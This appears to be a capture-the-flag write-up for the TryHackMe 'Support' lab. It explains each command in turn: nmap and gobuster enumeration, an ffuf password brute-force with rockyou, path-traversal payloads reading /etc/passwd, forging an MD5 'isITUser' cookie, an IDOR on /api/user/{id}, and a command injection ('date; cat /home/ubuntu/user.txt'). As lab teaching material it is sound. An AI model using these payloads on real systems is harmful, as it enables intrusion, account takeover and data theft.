# Commands Used — Explained

A command-by-command breakdown of every tool invocation used to solve the
TryHackMe Support lab, in the order they were run.

---

## 1. `nmap` — service discovery

```bash
nmap -sV -sC -p 1-5000 10.48.176.27 -T4
```

| Flag | Purpose |
|------|---------|
| `-sV` | Probe open ports to determine service/version info (e.g. `OpenSSH 9.6p1`, `Apache httpd 2.4.58`) |
| `-sC` | Run nmap's default safe NSE scripts (banner grabs, `http-title`, `ssh-hostkey`, `http-cookie-flags`, etc.) |
| `-p 1-5000` | Scan the first 5000 TCP ports instead of just the default top 1000, so nothing in that range is missed |
| `-T4` | Faster timing template — speeds up the scan without being so aggressive it risks dropping packets/false negatives |

**Why:** This is always the first step — figure out what's actually
reachable before doing anything else. It told me there were only two
services (SSH and HTTP), and the `http-title` script immediately named the
target as a "Support Operations Panel", pointing straight at the web app as
the attack surface. It also flagged `httponly flag not set` on the
`PHPSESSID` cookie, a minor hint the app's cookie handling wasn't solid.

---

## 2. `gobuster` — content/directory discovery

```bash
gobuster dir -u http://10.48.176.27 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,bak,js,zip,txt
```

| Flag | Purpose |
|------|---------|
| `dir` | Run gobuster in directory/file brute-force mode |
| `-u` | Target base URL |
| `-w` | Wordlist to brute-force paths with (SecLists' `directory-list-2.3-medium.txt`) |
| `-x php,bak,js,zip,txt` | Also try each wordlist entry with these extensions appended (`.php`, `.bak`, `.js`, `.zip`, `.txt`) — catches source/backup files that wouldn't show up as bare directory names |

**Why:** The nmap scan only shows that port 80 is open, not what's on it.
Gobuster maps the actual application structure. This surfaced `config.php`,
`api.php`, `logout.php`, and directories like `skins/` and `includes/` —
all of which became relevant later: `skins/` hinted at the theme-loading LFI,
and `api.php`/the API link explained where the BOLA endpoint lived.

---

## 3. `ffuf` — login password brute-force

```bash
ffuf -w /usr/share/wordlists/rockyou.txt \
  -X POST \
  -d "email=help@support.thm&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.48.176.27 \
  -s -fs 2678
```

| Flag | Purpose |
|------|---------|
| `-w rockyou.txt` | Wordlist of candidate passwords |
| `-X POST` | Send the login request as `POST`, matching how the real login form submits |
| `-d "email=help@support.thm&password=FUZZ"` | Request body; `FUZZ` is the placeholder ffuf substitutes with each wordlist entry — email was already known from the pre-filled login box |
| `-H "Content-Type: ..."` | Matches the content-type a real HTML form submission sends, so the backend parses the body correctly |
| `-u` | Target login endpoint |
| `-s` | Silent mode — suppress ffuf's banner/progress noise, print only matches |
| `-fs 2678` | **Filter by response size** — hide every response that is exactly 2678 bytes (the size of the "invalid password" page), so only the differently-sized (successful) response(s) are shown |

**Why:** Rather than guessing manually, this automates trying every password
in `rockyou.txt` against the known email and uses response-size filtering as
the success/failure oracle (a very common technique when a login failure
page has a fixed, predictable size). This found the valid password `snoopy`
for `help@support.thm`.

---

## 4. Manual LFI probing via the `skin` parameter

```
GET /dashboard.php?skin=../../../../etc/passwd
```

**Why:** The dashboard's "Select Theme" dropdown loads a page fragment
through a `skin=` GET parameter — a classic file-inclusion shaped input. I
tried direct path traversal to a well-known file (`/etc/passwd`) first as a
quick sanity check for LFI. It failed as a normal user, which told me there
was some additional access control in front of the feature (not that the
parameter itself was safe).

```
GET /dashboard.php?skin=../config
```

**Why:** Next I tried pointing the parameter at `config`, a path discovered
by `gobuster` — thinking the app might resolve it relative to the `skins/`
directory. This also failed, reinforcing that the blocker was authorization,
not the payload.

---

## 5. Cookie inspection & forging `isITUser`

**Action:** Opened browser DevTools → Storage/Cookies and inspected the
request headers, finding:

```
Cookie: isITUser=68934a3e9455fa72420237eb05902327
```

```bash
python3 -c "import hashlib; print(hashlib.md5(b'false').hexdigest())"
# 68934a3e9455fa72420237eb05902327   <-- matches the cookie exactly
```

**Why:** Recognizing that hash as `md5("false")` revealed the app was
storing a boolean flag as an MD5 hash in a client-editable cookie — i.e. the
server trusted a value the client fully controls to decide authorization.

```bash
python3 -c "import hashlib; print(hashlib.md5(b'true').hexdigest())"
# b326b5062b2f0e69046810717534cb09
```

**Why:** Computed the "true" equivalent locally, then edited the cookie
in DevTools to `isITUser=b326b5062b2f0e69046810717534cb09` and retried the
exact same traversal request from step 4. This time it worked — confirming
the vulnerability was an authorization bypass gating an LFI, not a problem
with the payload itself.

---

## 6. Reading the API object (BOLA/IDOR)

```
GET /api/user/3      (my own account)
GET /api/user/1      (changed the ID)
```

**Why:** The panel's "View API" button called a REST-style endpoint keyed by
a plain integer ID with no ownership check. After confirming my own ID (`3`)
returned my own data, decrementing it to `1` returned a *different* user's
full record — including `specialadmin@support.thm` with `"admin": true`.
This is the IDOR/BOLA step: no command-line tool needed, just manually
editing the URL/ID.

---

## 7. Admin login

Submitted the login form with the credentials assembled from the two leaks:

```
email:    specialadmin@support.thm   (from the BOLA response)
password: support@l10                (from the LFI-leaked $MASTER_PASSWORD)
```

**Why:** Combines the two independent bugs (BOLA → who the admin is, LFI →
what the admin's password is) into a full admin session, yielding the first
flag.

---

## 8. DOM editing for command injection

**Action:** In DevTools, edited the `<option>` element for the "Time" choice
in the date/time `<select>`:

```html
<option value='date; cat /home/ubuntu/user.txt'>Time</option>
```

Then selected that option in the UI, which auto-submitted `sysForm` (POST).

**Why:** The visible app only offers `date` as a value through the UI, but
since the `<select>`'s `value` attribute is just client-side HTML, it can be
edited freely before submission. Appending `; cat /home/ubuntu/user.txt`
chains a second shell command after whatever the server runs with the
`date` value (e.g. `shell_exec("date " . $_POST['sys'])`), proving — and
exploiting — OS command injection. The server's response then included the
contents of `user.txt`, i.e. the final flag.

---

## Quick Reference Table

| Step | Tool / Technique | Goal |
|------|-------------------|------|
| 1 | `nmap -sV -sC` | Identify open services/versions |
| 2 | `gobuster dir` | Enumerate hidden paths/files |
| 3 | `ffuf` (POST brute-force, `-fs` filter) | Crack the login password |
| 4 | Manual `skin=` traversal payloads | Probe for LFI |
| 5 | DevTools cookie edit + `hashlib.md5` | Bypass `isITUser` authorization check |
| 6 | Manual ID increment on `/api/user/{id}` | Exploit BOLA/IDOR to leak admin info |
| 7 | Login form | Authenticate as admin using leaked creds |
| 8 | DevTools DOM edit on `<option value=...>` | Exploit OS command injection for the final flag |
